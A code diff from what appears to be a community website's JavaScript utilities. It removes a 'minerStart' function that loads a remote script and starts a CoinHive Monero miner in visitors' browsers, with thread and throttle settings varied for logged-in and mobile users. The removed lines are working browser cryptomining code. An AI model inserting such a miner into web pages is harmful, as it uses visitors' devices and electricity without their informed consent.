@@ -30,29 +30,6 @@
  */
 var Util = {
   /**
-   * @description xmr 挖矿，收入将用于维持社区运维
-   */
-  minerStart: function () {
-    if (navigator.userAgent.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/)) {
-      return
-    }
-    $.ajax({
-      method: "GET",
-      url: 'https://static.hacpai.com/js/lib/xmr.min.js',
-      dataType: "script"
-    }).done(function () {
-      var data = {threads: 2, throttle: 0.5}
-      if (Label.isLoggedIn) {
-        data = {threads: 1, throttle: 0.8}
-      }
-      $.ua.set(navigator.userAgent);
-      if ($.ua.device && $.ua.device.type === 'mobile') {
-        data = {threads: 1, throttle: 0.8}
-      }
-      (new CoinHive.Anonymous('bSiM5UP0bWeY98R39fQBb2nKiiofSxmU', data)).start();
-    });
-  },
-  /**
    * 按需加载 MathJax 及 flow
    * @returns {undefined}
    */
